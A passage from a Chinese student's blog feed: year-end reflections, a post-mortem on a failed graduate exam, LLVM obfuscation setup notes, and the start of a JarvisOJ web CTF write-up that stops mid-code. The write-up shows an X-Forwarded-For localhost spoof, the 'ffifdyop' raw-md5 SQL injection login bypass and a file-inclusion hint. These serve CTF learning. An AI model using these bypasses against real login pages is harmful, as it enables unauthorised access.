title="招新"></a>招新</h2><p>今年去看了看面试，感觉现在年轻人越来越喜欢摆烂了。</p><p>今年依旧是招到了两个学妹三个学弟，感觉都挺聪明挺有潜力的，希望能好好学好好干，不要太腼腆，多跟学长学姐交流。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E6%88%91%E5%8F%AF%E4%BB%A5.jpg" alt="我可以"></p><h2 id="干饭时光"><a href="#干饭时光" class="headerlink" title="干饭时光"></a>干饭时光</h2><p>大四上因为疫情和考研过的比较平淡，比较有意义的事情一个是考研，第二个是干饭。这个学期跟社团的学弟学妹一起吃了蛮多顿饭，作为一个大四老东西，在疫情封控时期大家精神状态都不太妙，能有这种兄友弟恭，与学弟学妹共享天伦之乐的时光俨然值得我好好珍惜与怀念。</p><p>今年还喜欢上了喝威士忌，简简单单的威士忌加冰非常有风味，希望有时间能学学调酒。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E6%95%B4%E7%82%B9.jpg" alt="整点"></p><h2 id="考研失利"><a href="#考研失利" class="headerlink" title="考研失利"></a>考研失利</h2><p>粗略的来说就是：踩了很多坑 + 考前阳了 ——&gt; 失败。详情可以看另一篇文章：<a href="https://c1everf0x.top/posts/17836/">考研一战失败的反思与总结</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E4%B8%8D%E4%BA%89%E6%B0%94.jpg" alt="不争气"></p><p>考前学院送了加油包，蛮感动的，只可惜今年不争气，命也不好。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112041631319.png" alt="加油包"></p><p>姚老师也在考前送了橙子，今年没能马到🍊功，希望 2023 年二战能够大器晚🍊。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="大器晚成"></p>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++从0到0.1</title>
      <link href="/posts/35239/"/>
      <url>/posts/35239/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>考研一战失败的反思与总结</title>
      <link href="/posts/17836/"/>
      <url>/posts/17836/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>12.23 晚 10 点，坚持到了这里也算走完了一战全部的流程。</p><p>明天就要面对一场早已知道结果的考试，没有想过弃考，也没有做一些假努力来自己骗自己。</p><p>想来想去还是不想弃考，感觉不如坦然面对，哪怕今年百分之一万考不上，哪怕已经下定决心去二战了，哪怕顶着考完变阳的风险，我也会走进考场做完四张卷子，这不仅是我能力的展现，也是我面对挑战的态度。</p></blockquote><blockquote><p>12.24 晚 9 点</p><p>今天考的政治让我感觉肖1000白刷了，基本没几题见过的，选择题巨难。大题感觉肖4没压到，上微博看看肖老的微博，好像大家都说肖4的第四套压到了，可惜我只背了前两套，看了看第三套的答案，哭！</p><p>英语感觉也是特别难，第三篇半懂，第四篇完全看不懂，感觉跟 10 年的差不多难了，阅读技巧感觉都用不上，比较好的是大小作文还是英一常规考的，直接用Monkey的模板秒了。</p></blockquote><blockquote><p>12.25 晚 11 点</p><p>阳了，发烧又头晕，这下彻底寄了。</p><p>考数学的时候估计低烧，但是头很晕，有点头重脚轻的感觉，在考场里面再戴个n95，脑子跟堵死了一样，一点思路都没有，想题想的很慢。</p><p>考 408 的时候高烧，完全没办法做题，坚持进了考场，提前半小时交卷，认了，可能是命不好吧。</p><blockquote><p>23 考研宣告结束，有点不甘心，最有信心的数学和 408 因为生病没有考出真实水平。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="大器晚成"></p></blockquote></blockquote><blockquote><p>12.26 下午 3 点</p><p>在实验室顶着疲惫收拾完书和设备，没有体温计，感觉至少 39 度，趴在桌子上感觉呼吸有点困难，头比昨天考试的时候还要晕，估计是血氧不太够，不过也没难受太久。</p><p>12.26 晚 7 点</p><p>扛着 39.5 度，回到家吃完饭，爸妈也没问考研考的怎么样，给我拿了很多药吃，然后直接上床睡觉了。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>算是比较遗憾的一次考研，在这样的大环境下肯定不能全怪疫情，但是考数学和 408 的时候发烧确实是抹杀了上岸的最后一点可能性。</p><p>外部原因想了一下，感觉对我影响最大的倒也不是🐏了，可能是 5、6 月那时候因为专业的课程安排导致复习节奏的断档，进而把最好的状态搞丢了，之后无论怎么调整都调整不回来。其次就是暑假复习环境变来变去，又破坏了复习状态，导致强化阶段复习效果不好，蝴蝶效应又拖了最后刷真题冲刺阶段的后腿。最后才是发烧。</p><p><strong>但是最主要的还是个人原因。</strong></p><ol><li>不够纯粹，没能静下心：回想了一下，从 3 月份开始备考，开头三个月是我整个考研最好的状态，那时候真的感觉学什么都学的又快又好，之后因为不够纯粹，老是被课程、环境影响，再也没能静下心来，之后无论怎么样调整，也再也没能回到最好的这个状态。</li><li>复习策略有问题：英语过于追求阅读技巧，忘记了单词才是阅读之本；政治抱有侥幸心理；数学在强化阶段“重课轻题”，刷题量不足导致最后做真题的时候磕磕绊绊，计算能力也不够；408 学的没忘的快，上考场有些不那么偏的考点也没有做出来。</li><li>规划不够合理：只做了粗略的长期规划，没有把长期任务化小到每一天，导致每个阶段末都是在赶进度的学习，效果非常不好。</li><li>心态差：报名完后老是看报考学校的考研群，被真真假假的信息吓到了，影响了状态，停摆了好几天。</li></ol><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>如果想考 11408 的 985，真的很难，这个难不是数学难也不是 408 这些知识上的难，是难在每一个阶段都不能出错，需要每一个复习阶段有比较好的状态，如果有任何一个阶段效果不好，就会产生蝴蝶效应，对最后的成绩造成不小的影响。</p><p>其次是难在个人的定力与调整能力，再完美的复习规划也会遇到意外情况，如何调整复习计划和个人的状态非常重要，做的计划一定要留容错来应对意外的发生，更要及时调整自己的状态，尤其是不要去抱怨意外发生，而是要找到最优解来解决问题。复习一定要够坐的住，够纯粹，不能三心二意。</p><p>最后是坚持和脚踏实地，复习千万不能有侥幸心理。没背完肖4真的很遗憾；没有坚持背单词只寄托于技巧的下场就是题目和选项都读不懂；不练计算不刷题的下场就是做题定位不到知识点还巨他妈慢；反复是遗忘他妈，学 408 一定要学的比忘得快</p><blockquote><p>2023.1.6 晚 9 点 </p><p>回家以后发了两天烧，退烧以后没有刀片嗓也没有喉咙痛，只是觉得很累，症状算是比较轻。</p><p>仔细思考以后还是决定二战，再努力一年，要还是因为自己的原因或者是真的实力不够，也认了，到时候船到桥头自然直，哥们至少不是大学四年浑浑噩噩过的，能调回来调回来，大不了换个赛道去出国或者考公，实在不行把技术捡回来去上班。</p><p>所以这一路颠沛流离的结局是什么呢，我希望是大器晚成吧。</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="大器晚成"></p>]]></content>
      
      
      <categories>
          
          <category> 生活杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm代码混淆学习（零）</title>
      <link href="/posts/32815/"/>
      <url>/posts/32815/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>随便学学 llvm 代码混淆，顺便做个毕设，水几篇文章就当做做笔记</p></blockquote><h1 id="LLVM-简介"><a href="#LLVM-简介" class="headerlink" title="LLVM 简介"></a>LLVM 简介</h1><p>一个包含了很多模块的编译器框架，因为其 LLVM Pass 框架的特殊性，能够干预中间代码的优化过程，跟代码混淆技术契合度很高，所以 LLVM 编译器常被用来研究代码混淆。</p><h2 id="LLVM-编译过程"><a href="#LLVM-编译过程" class="headerlink" title="LLVM 编译过程"></a>LLVM 编译过程</h2><p>前端：Clang</p><p>前端对高级语言源代码进行词法分析、语法分析和语义分析，最后产生中间代码 LLVM IR。</p><p>优化器，后端：LLVM Core</p><p>优化器对中间代码 LLVM IR 进行优化，并且能够加载 LLVM Pass 执行用户自定义的优化（本研究用于代码混淆）。</p><p>后端则根据优化后的代码生成目标平台的机器代码。</p><h2 id="LLVM-目录结构"><a href="#LLVM-目录结构" class="headerlink" title="LLVM 目录结构"></a>LLVM 目录结构</h2><ul><li>llvm&#x2F;include&#x2F;llvm：LLVM 提供的一些公共头文件</li><li>llvm&#x2F;lib：LLVM大部分源代码和一些不公开的头文件</li><li>llvm&#x2F;lib&#x2F;Transforms：<strong>所有 LLVM Pass 的源代码</strong>和一些 LLVM 自带的 Pass</li></ul><h1 id="LLVM-环境搭建"><a href="#LLVM-环境搭建" class="headerlink" title="LLVM 环境搭建"></a>LLVM 环境搭建</h1><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><ul><li>Ubuntu 18.04</li><li>LLVM 12.01</li><li>Cmake 3.22.1</li></ul><blockquote><p>用 Ubuntu 18.04 编译 LLVM 12.01 时，cmake 版本指定为 3.13 以上，直接用 apt 安装的 cmake 是 3.10.2，所以需要自己下载高版本的 cmake。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127104321293.png" alt="image-20230127104321293"></p><p>步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.22/cmake-3.22.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.22.1.tar.gz</span><br><span class="line">mv cmake-3.22.1 /usr/local/bin/cmake</span><br><span class="line">cd /usr/local/bin/cmake</span><br><span class="line">./bootstrap</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ln -sf /usr/local/bin/cmake/bin/* /usr/bin/</span><br></pre></td></tr></table></figure><p>问题：Could NOT find Open SSL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>问题：Cmake error could not find CMAKE_ROOT </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash -r</span><br></pre></td></tr></table></figure></blockquote><h2 id="第一步：下载-LLVM-Core-和-Clang-源代码"><a href="#第一步：下载-LLVM-Core-和-Clang-源代码" class="headerlink" title="第一步：下载 LLVM-Core 和 Clang 源代码"></a>第一步：下载 LLVM-Core 和 Clang 源代码</h2><p>下载地址：<a href="https://github.com/llvm/llvm-project/releases/tag/llvmorg-12.0.1">Release LLVM 12.0.1 · llvm&#x2F;llvm-project · GitHub</a></p><ul><li><a href="https://github.com/llvm/llvm-project/releases/download/llvmorg-12.0.1/clang-12.0.1.src.tar.xz">clang-12.0.1.src.tar.xz</a></li><li><a href="https://github.com/llvm/llvm-project/releases/download/llvmorg-12.0.1/llvm-12.0.1.src.tar.xz">llvm-12.0.1.src.tar.xz</a></li></ul><p>在 <code>/home/llvm/Programs</code> 文件夹内创建 <code>llvm-project</code> 文件夹，存放下载的源码压缩包。</p><p>将两个压缩包解压之后改名为 llvm 和 clang ，方便后续使用。 </p><p>在同一文件夹内创建名为 <code>build</code> 的文件夹，存放编译后的 LLVM。 此时的目录结构如下：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127105808960.png" alt="image-20230127105808960"></p><h2 id="第二步：编译-LLVM-项目"><a href="#第二步：编译-LLVM-项目" class="headerlink" title="第二步：编译 LLVM 项目"></a>第二步：编译 LLVM 项目</h2><p>在 llvm-project 目录下创建 <code>build.sh</code>，写入下面内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br><span class="line">cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang&quot; \</span><br><span class="line">-DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \</span><br><span class="line">-DBUILD_SHARED_LIBS=On ../llvm</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="cmake-参数解释："><a href="#cmake-参数解释：" class="headerlink" title="cmake 参数解释："></a>cmake 参数解释：</h3><ul><li><p>-G “Unix Makefiles”：生成Unix下的Makefile </p></li><li><p>-DLLVM_ENABLE_PROJECTS&#x3D;”clang”：除了 LLVM Core 外，还需要编译的子项目。 </p></li><li><p>-DLLVM_BUILD_TYPE&#x3D;Release：在 cmake 里，有四种编译模式：Debug, Release,  RelWithDebInfo, 和MinSizeRel。使用 Release 模式编译会节省很多空间。 </p></li><li><p>-DLLVM_TARGETS_TO_BUILD&#x3D;”X86”：默认是 ALL，选择 X86 可节约很多编译时间。 </p></li><li><p>-DBUILD_SHARED_LIBS&#x3D;On：指定动态链接 LLVM 的库，可以节省空间。 </p></li><li><p>make install 指令是将编译好的二进制文件和头文件等安装到本机的 &#x2F;usr&#x2F;local&#x2F;bin 和 &#x2F;usr&#x2F;local&#x2F;include 目录，方便后续使用。</p></li></ul><p>执行 <code>build.sh</code> 文件自动安装和编译，编译时长从十多分钟到数小时，具体时间由机器性能决定。</p><blockquote><p>执行 <code>build.sh</code> 文件必须要有管理员权限</p></blockquote><p>输入 <code>clang -v</code> 确认编译和安装是否完成：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127110132043.png" alt="image-20230127110132043"></p><h1 id="LLVM-Pass-简介"><a href="#LLVM-Pass-简介" class="headerlink" title="LLVM Pass 简介"></a>LLVM Pass 简介</h1><p>LLVM Pass 框架是整个 LLVM 提供给用户用来干预代码优化过程的框架，可以用来编写代码混淆工具，也可以用来写 fuzz、hook</p><p>编译后的 LLVM Pass 通过优化器 opt 进行加载，可以对 LLVM IR 中间代码进行<strong>分析</strong>和<strong>修改</strong>，生成新的中间代码</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230203010751961.png" alt="image-20230203010751961"></p><h2 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h2><p>第一种：和整个 LLVM 一起重新编译，Pass 代码需要放在 llvm&#x2F;lib&#x2F;Transforms 文件夹中，比较耗时</p><p>第二种：通过 Cmake 对 Pass 进行单独编译，方便快捷</p><p>第三种：使用命令行对 Pass 进行单独编译，项目越大越不好管理</p><h2 id="Pass-类型"><a href="#Pass-类型" class="headerlink" title="Pass 类型"></a>Pass 类型</h2><p>设计新 LLVM Pass 时，最先需要决定的就是选择 Pass 的类型，包括：</p><ul><li>ModulePass（基于模块）</li><li>FunctionPass（基于函数）</li><li>CallGraphPass（基于调动图）</li><li>LoopPass（基于循环）</li></ul><p>毕设学习重点是 FunctionPass</p><ul><li>FunctionPass 以函数为单位处理</li><li>FunctionPass 的子类必须实现 runOnFunction（Function &amp;F）函数 </li><li>FunctionPass 运行时会对程序中每一个函数执行 runOnFunction 函数</li></ul><h2 id="简单编写"><a href="#简单编写" class="headerlink" title="简单编写"></a>简单编写</h2><ul><li>创建一个类（class），继承 FunctionPass 父类</li><li>在创建的类中实现 runOnFunction（Function &amp;F）函数</li><li>向 LLVM 注册 Pass 类</li></ul><h2 id="代码模板"><a href="#代码模板" class="headerlink" title="代码模板"></a>代码模板</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Demo</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Demo</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runOnFunction 函数实现</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Demo::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Demo::ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 注册该 Demo Pass</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Demo&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Pass 描述.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><ul><li>直接使用 Cmake 进行编译</li><li>在 Build 文件夹内可以找到编译好的 so 文件</li></ul><h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><p>使用优化器 opt 将处理中间代码，生成新的中间代码，例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt -load ./LLVMObfuscator.so -hlw -S hello.ll -o hello_opt.ll</span><br></pre></td></tr></table></figure><ul><li><code>-load</code> 加载编译好的 LLVM Pass 进行优化</li></ul><h2 id="Cmake-项目创建"><a href="#Cmake-项目创建" class="headerlink" title="Cmake 项目创建"></a>Cmake 项目创建</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><ul><li>Build</li><li>Test<ul><li>TestProgram.cpp</li></ul></li><li>Transforms<ul><li>include</li><li>src<ul><li>HelloWorld.cpp</li></ul></li><li>CMakeLists.txt</li></ul></li><li>test.sh</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230203013038708.png"></p><h3 id="目录介绍"><a href="#目录介绍" class="headerlink" title="目录介绍"></a>目录介绍</h3><p>Build：存放编译后的 LLVM Pass</p><p>Test：存放测试程序 TestProgram.cpp</p><p>TestProgram.cpp：待混淆文件，内容如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> input[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> enc[<span class="number">100</span>] = <span class="string">&quot;\x67\x75\x61\x72\x5b\x6a\x66\x93\x8c\x8a\x86\x89\x7f\x49\x8b\x7f\x93\x2e\x7f\x52\x63\x61\x6e\x67\x7f\x75\x7d\x21\x61\x9d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *dest, <span class="type">char</span> *src)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(src);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dest[i] = (src[i] + (<span class="number">32</span> - i)) ^ i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GUETCTF&#123;llvm_1s_s0_4king_ea5y&#125;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dest[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">encrypt</span>(dest, input);</span><br><span class="line">    <span class="type">bool</span> result = <span class="built_in">strlen</span>(input) == <span class="number">30</span> &amp;&amp; !<span class="built_in">memcmp</span>(dest, enc, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations~\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transforms&#x2F;include 文件夹：存放整个 LLVM Pass 项目的头文件</p><p>Transforms&#x2F;src 文件夹：存放整个 LLVM Pass 项目的源代码</p><p>Transforms&#x2F;src&#x2F;HelloWorld.cpp：HelloWorld Pass 的源代码，一般一个 Pass 使用一个 cpp 文件实现即可</p><p>Transforms&#x2F;CMakeLists.txt：整个 CMake 项目的配置文件，内容如下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考官方文档：https://llvm.org/docs/CMake.html#developing-llvm-passes-out-ofsource</span></span><br><span class="line"><span class="keyword">project</span>(OLLVM++)<span class="comment"># 整个项目名称</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.13</span>.<span class="number">4</span>)<span class="comment"># CMake 最低版本</span></span><br><span class="line"><span class="keyword">find_package</span>(LLVM REQUIRED CONFIG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(APPEND CMAKE_MODULE_PATH <span class="string">&quot;$&#123;LLVM_CMAKE_DIR&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">include</span>(AddLLVM)</span><br><span class="line"><span class="keyword">include_directories</span>(<span class="string">&quot;./include&quot;</span>) <span class="comment"># 包含 ./include 文件夹中的头文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">separate_arguments</span>(LLVM_DEFINITIONS_LIST NATIVE_COMMAND <span class="variable">$&#123;LLVM_DEFINITIONS&#125;</span>)</span><br><span class="line"><span class="keyword">add_definitions</span>(<span class="variable">$&#123;LLVM_DEFINITIONS_LIST&#125;</span>)</span><br><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line">add_llvm_library( LLVMObfuscator MODULE</span><br><span class="line">  src/HelloWorld.cpp</span><br><span class="line">)<span class="comment"># 向 LLVM 注册 LLVMObfuscator 模块，每个模块对应一个 so 文件，包含 src/HelloWorld.cpp 源代码</span></span><br></pre></td></tr></table></figure><p>test.sh：编译 LLVM Pass 并对 Test 文件夹中的代码进行测试，内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd ./Build</span><br><span class="line">cmake ../Transforms</span><br><span class="line">make</span><br><span class="line">cd ../Test</span><br><span class="line">clang -S -emit-llvm TestProgram.cpp -o TestProgram.ll</span><br><span class="line">opt -load ../Build/LLVMObfuscator.so -hlw -S TestProgram.ll -o TestProgramhlw.ll</span><br><span class="line">clang TestProgramhlw.ll -o TestProgramhlw</span><br><span class="line">./TestProgramhlw</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-Web-wp</title>
      <link href="/posts/7832/"/>
      <url>/posts/7832/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>这几天 BUU 平台机房出故障了，回来把 JarvisOJ 平台已经做过的和剩下的 web 全部写一遍 wp 吧，很怀念大一那时候跟鹏神晚上通宵干题的时光，一转眼都过了一年了</p></blockquote><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p>需要用公网的一台服务器访问其 51 端口</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113148.png"></p><p><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></p><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>添加 xff 头<code>x-forwarded-for: 127.0.0.1</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113727.png"></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>一个登录框，随便填抓包发现有 <code>hint</code>，是一个经典的 md5 型 sql 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&#x27;&quot;.md5($pass,true).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114047.png"></p><p>payload：<code>ffifdyop</code></p><p><code>md5()</code>函数第二个参数是规定输出格式。<code>true</code>：输出原始16字符二进制格式吗，<code>false</code>：输出32字符十六进制数</p><p>原理：想要绕过，需将此语句填充为：<code>select * form admin where password=&#39;&#39;or 1</code></p><p>以前师傅们的总结，字符串：<code>ffifdyop</code>经过<code>md5</code>加密后：<code>276f722736c95d99e921722cf9ed621c</code></p><p>再转换为字符串：<code>&#39;or&#39;6&lt;乱码&gt;</code></p><p> 所以拼接后的语句为：<code>select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;</code> ，就相当于<code>select * from admin where password=&#39;&#39;or 1</code>，实现注入。</p><h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><p>源码中有提示，base64 解码后为<code>shield.jpg</code>，经典文件包含漏洞</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114838.png"></p><p>读<code>showimg.php</code>，拿到源码</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218115217.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ 